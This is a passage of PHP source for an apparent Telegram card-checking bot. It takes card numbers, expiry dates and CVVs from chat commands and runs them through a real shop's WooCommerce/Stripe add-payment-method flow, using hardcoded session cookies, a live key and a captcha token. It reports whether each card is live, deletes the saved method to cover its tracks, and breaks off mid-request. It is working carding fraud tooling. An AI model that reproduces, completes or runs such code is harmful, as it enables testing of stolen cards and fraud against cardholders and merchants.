    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    editMessage($chat_id, $respuesta, $id_text);
} else {
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

}


elseif((strpos($message, "!ta") === 0)||(strpos($message, "/ta") === 0)||(strpos($message, ".ta") === 0)){

$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = trim($i[0]);
$mes   = trim($i[1]);
$ano  = trim(substr($i[2], -2));
$cvv   = trim($i[3]);

$bin = substr($lista, 0, 6);
////


$longitud = 4;
$partes = [];

for ($i = 0; $i < strlen($cc); $i += $longitud) {
    $parte = substr($cc, $i, $longitud);
    $partes[] = $parte;
}


$bin = substr($lista, 0, 6);
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
        if($verify != ""){
                $respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
                sendMessage($chat_id,$respuesta, $message_id);
                die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){

}else{
        $respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ta cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !ta cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .ta cc|m|y|cvv\n";
        sendMessage($chat_id,$respuesta, $message_id);
        die();
}
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
        //----------------------------------------------------//


$cc = implode('+', $partes);

$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://tayhope.com/my-account/add-payment-method/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => '__stripe_mid=f87acd8c-3c42-492d-a089-d786e071117723820f; wordpress_logged_in_c070ca56ecb509fdfa7f9f75c40ac645=reech1951%7C1732924778%7C69TKrBK1V9SgCsX2ZOLdaRX6UOxgRfN40Uu1MjesFic%7C0bb916415e9e6e6e5ee677ab1839392de7209173e898fec8aec33a853e8efcf4; wp_woocommerce_session_c070ca56ecb509fdfa7f9f75c40ac645=200%7C%7C1731887937%7C%7C1731884337%7C%7C8d1d339670b9baedf6f1ed5a0529c4cb; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; dontshow=true; __stripe_sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftayhope.com%2F; woocommerce_items_in_cart=1',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'accept-language: es-US,es;q=0.9',
    'sec-ch-ua-platform: "Android"',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
// Extraer nonce
$patron_nonce = '/"createAndConfirmSetupIntentNonce":"([^"]*)"/';
preg_match($patron_nonce, $response, $matches_nonce);
$nonce = $matches_nonce[1];
curl_close($curl);


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10080&billing_details%5Baddress%5D%5Bcountry%5D=US&payment_user_agent=stripe.js%2Fa3221739cb%3B+stripe-js-v3%2Fa3221739cb%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ftayhope.com&time_on_page=32394&client_attribution_metadata%5Bclient_session_id%5D=8c405d81-87ee-4878-903c-8197346734a2&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=79b6db38-13c2-4b80-9428-9d00a6cea8d23a2bca&muid=f87acd8c-3c42-492d-a089-d786e071117723820f&sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954&key=pk_live_51PRDRyRu0O8mp73n3o0HQHdi68URnbYQVlBpDv1iGSlngWgApN1jmzay2cuYC5gZlO0MFZKg3UyaLKPS54vnWSjF001pzrXQWc&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiZXJMdVJoeHJHcFVnTVF5NEVsVzdwWG1CVFpQOGJVazNrY2g0OUNVcFNydUxjZ29sZTFLNEZyVER1b1ZKRXpPRThpQkxkb3plT3ZIWWNRbTR6SE81NllqVnJVd1hieHkyckUzWmtGQmpKcHIyMXg1T2xjM3R0NDRtd29TOFBVY2h1NTkvQ1JXeC94ZmFyVHFtUDc0QTZic1RXdDhUWVpma3JFa2xQN2xBVEp1ZDM4eGhmOGFYcUZEU3VYOS9NdGc0T2VVdW5xSE1RNWRRM0w0ZlJFMWlEd3prQ3ZnQnRoTFM5WjhrMGhHelM1R3lzQ0Y5UllBRXVYK0k5dk91eGE4ZGMvSEExZ0Njd0Z2Q015czltaUVYeGdRaTY0Z0xTcE5WNjAxVUZpS05kUmJMU1V6RFl1dkowSzhxUDdsZ3FGdHZIdU9uUGZ5S0Vkd1FKQXlyYlBBL3VjQyswZWd6S1FKOXBiYlorNlhhUk9ibllaSzRLSnBHVGFRd3JTTW90cDZrLytlQXpvbWkyVEwyT0JKNHliWnQxdVFpU3c0akNlMk5wcU5jTVN1RWlES1dzd2hkYnVkTXZNc2ZIRVQ5T1dlMG5DdndnN1AwMXFVSmt1WWE5ZXhmd3hZSXdKZUpteVhBbnJ5bUM2RkhEaWp5Tml0OE41N3FoclpBQ1NNQXZ3QzcwOFk5d1hobHBKV1BTUXZvRUNpZ3llWUNCQ2dNOE0zTElJSit0SzNwUiszWWRaVlV4Z1NSVWxRajJnVlYwYlJGSVN0RlRjZHFzU0xhWXd3N1hzVzJYRk9DKzJSMHJCMnZidUloZXBBRm9JWVZLWHdnb0FDK0U4ZUZLV1Jld2ZoMExNcG45OWhETDZDcVIyREdwZWVvTzYwQzJiZ2dKbFJhbnRxUEg2WFhGZUR3YWRaTWRaS3ZIcmo4MUgrQ2llanMyWWxqYThXNXYxY3c0QTdWRXRSRlBrZ29KSzVQenEyOWo0Q2RaMEtheWVTV0FpV3VEMUd6WG1haEU0NjI2WVN2ZjcrYWdKSDZldDRVV2ZOYUI5SkQwcVRSVlhMSzYyT212QitLYlpyOERoVFA1R0c3TUt1TmxTN0tIdG9OUXVTekxzdldrRUJWQnEydTlqMTZyeEpIN2JWSXlwM1hFczNxbHRQd09mUjg3YVBDNERJNWx6QzdldDNQVEQ4a0VkSDdoejlxQmxDYlY3L09CVXpaa3ZKOEJ4OVJPWDlDWUNsQklFczZHbndFM3JSVjgvRzUvZXZUbHo4c1pQcTBTR1EvZ3dlbkZqL2xySU9TZmNoSUJZMzRvWUhVM0Jnc3BMVy95K1JXVzZLbnBrYmdXaVRrNmdnRVZrZ1NmWDcreTNKZE9nYm1sbWRtTkhGRW9ock41b284cFhzd2QyQWdaWFB6UDVzSmNLWS81bnJ3dklNVklRYjlVR2E0eUszMVl4WXgyUndQTVRvVjlUd3hQbDdzY0wrTVJTeXhMd0NINHlLU1hGZVVkQzB3OTJ2RFZzK2tJaUVRYTVqZjd3bnppWUVDcTU0U0I4ekVGS01DN0U4LzhqOFF2Vi8yTjN5R0FDNHV4dWVoMjNZajRZN28xd1Y3WmxEcDh0dDV3Nk9xLzdBQjVkcTREZmdUY2xZMmJuRGJHb0h3V2tMeGJWTG9hSFdxWm9aUFlJWmFEL0FUWHJ2MGVtSkdsa0h1OHk5YzRuWFI5cVlPWXJlZXEvd2NIbFlhRTJnaXIxT3V1OEF6TWVwZjNoZ1NObXZrVjZic1BhNHlNUHpIREdPMEI3VjVzbm41UU5RdFoyeDM5ZnY2VitIOXFpY2VDVnI1SEE0aEFpa05abjBlQWNUcFNmdDJmZWNSL2ZEZGtQWG0vYTZRVHJmRDVZOTExdEV2Z045cmhIYjZrQ0dBY0QyaFRUbVhONlBnMlJvYkFsSmZ0SWY1ZTlWeXhkc2NKd2l5cG5RT0t2RW9hcDRrcXg2L1lIKy9HVDlIL01PWXY3S3JrM3lWTnhLSGw3V2ZXOTJVVVpvTGxZaUVBczJHd2h4bVdxQzRXbEY2bjNHRFgxa0IyQXdCMlQzOWtiTG5TNnpPQjBFWnR1Zm01eVdwY0dJcjdXUXdKRk5TcU9qS24xbTZRM3c0OWdkaVRsK1BIN0RPMmFiRVdhejZGOGdjck1kT3RvajJGZStMbE1uZkJJcDY3dHlJZ2hHdHRrVjNjVHFMWm50Wk9yZkVYYkRwMW8yVHFsZkJXRkRXLzZiMGZ4MEM1YWJMNUVOa0hISk5wY1RaZHgyd3RFeTVRaHR6NURORDZtYTNSYmVudDIyL1hxLzBYWUZJTmhIZ2JzclVpUnRDR3hoM1QxVTcrd0g2K3l0V1o5N2J6YlpOMzlDVmZOU25Xem1XcVAvR2tYeWdtYWQvRzlvNzdXd2w3QkNUeFR3ZzJjM1JobmJUMkl3OGFGRlBaUng5dEkvdldGN2xac3FlNkpBMVRyQm9iM054TDhtaVVoYkhOazVxZkZHN1JYSWxzM2tWMkZTQlBCMTZjaFNKNVZhdVBFREFydER2RUI2d08xY1oxTzlUYVE1bG1nTmFZZzBXZ3FDZ3lsTzN5MTA4bVFleEFLYVU0QS9jMWpnYTZBUkhqb0ZQWXVBcFIySEhRYW92ZEZzMWpUVUZrc21ZTTYwYUlqeUZrb3IwbW82NElqM0tveHR0SEczYmgzWW80SWQrTkhtR3hZOUd3Z0dEMjdwald5dk5wZndaRkNaMzJDUTkzQkhvTlo5SEZCK0ZRMUpaWVpBb29BZ0xBaXd0ZEZiZUgvUXJKcGNYbURxV1h3PT0iLCJleHAiOjE3MzE3OTkzMDQsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiMWZmMDllMmQiLCJwZCI6MCwiY2RhdGEiOiJIbWxnbHpWaTRiUjUxaUhhSjM1Z0ZtRUNuN1ZXSTVIRXYrUVovY1NCMXZKNVZmVWNQSHFzYUJuNmZGYUVRTXdqU3h0OFJjVUttWjF1aUl0TTZyNTV4RVdaWjdycGFBMEZIck9QL1FuenF1bXplQjUzNTYvTytnN2ZvWmZrN1FKbGwzOTdvbmt6SGVQQnJzdlJFN1BBbWcxamp2YWpDdnpZbDVmUDUyWHQ5RnN4Sk1HY3N4RzgrMUVWaUVYaExpVEVHOVVmYmZyU3dhcUkyWlArIn0.Fja1qIx2qx8Y4OqICzg1kr4YgH6kX0UYl1XYACNkOIE',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json["id"];
curl_close($curl);



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://tayhope.com?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$nonce.'',
  CURLOPT_COOKIE => '__stripe_mid=f87acd8c-3c42-492d-a089-d786e071117723820f; wordpress_logged_in_c070ca56ecb509fdfa7f9f75c40ac645=reech1951%7C1732924778%7C69TKrBK1V9SgCsX2ZOLdaRX6UOxgRfN40Uu1MjesFic%7C0bb916415e9e6e6e5ee677ab1839392de7209173e898fec8aec33a853e8efcf4; wp_woocommerce_session_c070ca56ecb509fdfa7f9f75c40ac645=200%7C%7C1731887937%7C%7C1731884337%7C%7C8d1d339670b9baedf6f1ed5a0529c4cb; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; dontshow=true; __stripe_sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'x-requested-with: XMLHttpRequest',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://tayhope.com',
    'referer: https://tayhope.com/my-account/add-payment-method/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
//------------------------------------------//
//$message = $json['data']['error']['message'];
$message = str_replace("Error: ", "", $json['data']['error']['message']);
$success = $json['success'];
$status = $json['data']['status'];
curl_close($curl);

if ($success === true && $status === "succeeded") {
    $respo = "𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅!";


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://tayhope.com/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => '__stripe_mid=f87acd8c-3c42-492d-a089-d786e071117723820f; wordpress_logged_in_c070ca56ecb509fdfa7f9f75c40ac645=reech1951%7C1732924778%7C69TKrBK1V9SgCsX2ZOLdaRX6UOxgRfN40Uu1MjesFic%7C0bb916415e9e6e6e5ee677ab1839392de7209173e898fec8aec33a853e8efcf4; wp_woocommerce_session_c070ca56ecb509fdfa7f9f75c40ac645=200%7C%7C1731887937%7C%7C1731884337%7C%7C8d1d339670b9baedf6f1ed5a0529c4cb; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; dontshow=true; __stripe_sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://tayhope.com/my-account/add-payment-method/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/\/\d+\/\?_wpnonce=[a-f0-9]+/';
preg_match($patron, $response, $coincidencias);
$url_nonce = $coincidencias[0];
curl_close($curl);

echo "$url_nonce\n";




$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://tayhope.com/my-account/delete-payment-method'.$url_nonce.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => '__stripe_mid=f87acd8c-3c42-492d-a089-d786e071117723820f; wordpress_logged_in_c070ca56ecb509fdfa7f9f75c40ac645=reech1951%7C1732924778%7C69TKrBK1V9SgCsX2ZOLdaRX6UOxgRfN40Uu1MjesFic%7C0bb916415e9e6e6e5ee677ab1839392de7209173e898fec8aec33a853e8efcf4; wp_woocommerce_session_c070ca56ecb509fdfa7f9f75c40ac645=200%7C%7C1731887937%7C%7C1731884337%7C%7C8d1d339670b9baedf6f1ed5a0529c4cb; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; dontshow=true; __stripe_sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954; woocommerce_items_in_cart=1; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://tayhope.com/my-account/payment-methods/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);


} elseif ($success === true && $status === "requires_action") {
    $respo = "3DS Authenticate Rejected ❌";
} else {
    $respo = $message;
}


$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


if (empty($respo)) {
        $respo = $response;
}


if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR  ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    editMessage($chat_id, $respuesta, $id_text);
} else {
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

}
	
	
elseif((strpos($message, "!tr") === 0)||(strpos($message, "/tr") === 0)||(strpos($message, ".tr") === 0)){

$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = trim($i[0]);
$mes   = trim($i[1]);
$ano  = trim(substr($i[2], -2));
$cvv   = trim($i[3]);

$bin = substr($lista, 0, 6);
////

$longitud = 4;
$partes = [];

for ($i = 0; $i < strlen($cc); $i += $longitud) {
    $parte = substr($cc, $i, $longitud);
    $partes[] = $parte;
}                                                                     

$bin = substr($lista, 0, 6);
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
        if($verify != ""){
		$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
                sendMessage($chat_id,$respuesta, $message_id);
                die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){

}else{
        $respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /tr cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !tr cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .tr cc|m|y|cvv\n";
        sendMessage($chat_id,$respuesta, $message_id);
        die();
}
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
        //----------------------------------------------------//

$cc = implode('+', $partes);

$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.thetravelinstitute.com/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
